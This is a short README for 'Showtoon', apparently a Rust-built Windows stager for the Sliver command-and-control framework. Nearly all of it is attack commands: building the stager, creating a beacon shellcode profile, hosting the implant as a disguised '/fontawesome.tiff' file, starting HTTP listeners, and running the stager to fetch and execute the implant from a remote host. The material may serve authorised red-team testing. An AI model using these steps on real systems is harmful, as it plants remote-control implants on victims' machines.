# Showtoon Sliver Stager


### Build

With just

```
just build
```

or

```
cargo build --release --target x86_64-pc-windows-gnu
```

### Usage

Use showtoon to reach out to the stager
```
.\showtoon.exe IP:8787
```



### Sliver

Create a test profile for the stager
```
profiles new -b http://IP:8686 beacon --skip-symbols --format shellcode windows-test
```

Add implant to http server
```
 websites add-content --content /fontawesome.tiff --web-path /fontawesome.tiff --website test
```

Host the implant
```
http --website test --lport 8787
```

Start the http listener
```
http -l 8686
```
